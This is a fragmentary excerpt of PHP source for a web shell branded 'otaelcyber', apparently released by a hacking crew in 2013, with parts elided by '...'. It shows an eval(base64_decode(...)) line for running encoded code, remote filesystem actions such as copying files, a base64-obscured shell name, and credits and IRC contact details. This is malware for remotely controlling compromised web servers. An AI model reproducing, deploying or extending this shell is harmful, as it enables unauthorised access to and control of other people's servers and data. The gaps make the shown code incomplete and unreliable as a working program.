...
$fxbuff = ""; eval(base64_decode($fxbuff));
...
## PHP FILESYSTEM TRICKS (By agger) ##
$phpfsaliases = array(
...
if ($act == "tools") { tools(); }
##[ PHP FILESYSTEM TRICKZ (By agger) ]##
if ($act == "phpfsys") { 
  echo "<div align=left>";
  $fsfunc = $phpfsysfunc;
  if ($fsfunc=="copy") {
...
if ($act == "about") {
  echo "<center><b>Credits:</b><br>Idea, leading and coding by <b>agger [OtaeLCybeR TeaM]</b><br>".
       "Beta-testing and some tips by <b>agger [OtaeLCybeR tEaM]</b><br>".
       "Re-Coding, tricks, html and css by <b>agger [OtaeLCybeR CreW]</b><br><br>".
       "Report bugs to <a href=\"mailto:agger@zonairc.tk\">agger</a></b>";
}
echo "</td></tr></table>\n";
/*** COMMANDS PANEL ***/
?>
...
function sh_name() { return base64_decode("b3RhZWxjeWJlcg==").sh_ver; }
...
<body>
<div class=bartitle><h4>'.sh_name().'</h4>.: otaelcyber :.</div>
';
return $html_start;
};
function footer() {
  echo "<div class=bartitle colspan=2><font size=1 color=#00FF00> By agger, © 2013 #otaelcyber irc.otaelcyber.net Generated: ".round(getmicrotime()-starttime,4)." seconds</font></div>";
}
